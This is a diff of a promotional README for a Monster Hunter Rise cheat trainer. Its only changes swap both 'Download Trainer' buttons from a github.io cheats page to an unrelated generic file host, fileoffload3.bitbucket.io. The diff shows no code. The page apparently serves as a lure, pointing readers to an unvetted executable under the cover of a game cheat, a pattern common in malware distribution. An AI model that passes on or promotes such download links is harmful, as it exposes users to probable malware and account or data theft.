@@ -6,14 +6,14 @@ Monster Hunter Rise Trainer 🎮 One-Hit Kill, Max Items, God Mode & Skill Coold
 
 Whether you’re new to **Monster Hunter Rise** or just burned out from endless grinding, the **Monster Hunter Rise Trainer** gives you everything you need to blast through quests, farm instantly, and turn your hunter into a true beast slayer. From **unlimited stamina and health** to **one-click max items, skill cooldown skips, and mega damage boosts**, this trainer saves you hundreds of hours of grind time. 🐲🔥
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/monster-hunter-rise/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload3.bitbucket.io)
 ---
 
 ## 🎮 What Is a Trainer?
 
 A **trainer** is a lightweight cheat tool that runs alongside the game and gives you **one-click access to powerful gameplay hacks**. Unlike mods or save edits, trainers work live—meaning you can toggle features during the hunt, in the village, or even mid-combo. 💡
 
-[![Download Trainer](https://www.games-manuals.com/wp-content/uploads/2023/01/MONSTER-HUNTER-RISE-Trainer-WeMod.png)](https://wecheaters.github.io/cheats/monster-hunter-rise/)
+[![Download Trainer](https://www.games-manuals.com/wp-content/uploads/2023/01/MONSTER-HUNTER-RISE-Trainer-WeMod.png)](https://fileoffload3.bitbucket.io)
 ---
 
 ## 🔥 Monster Hunter Rise Trainer Features
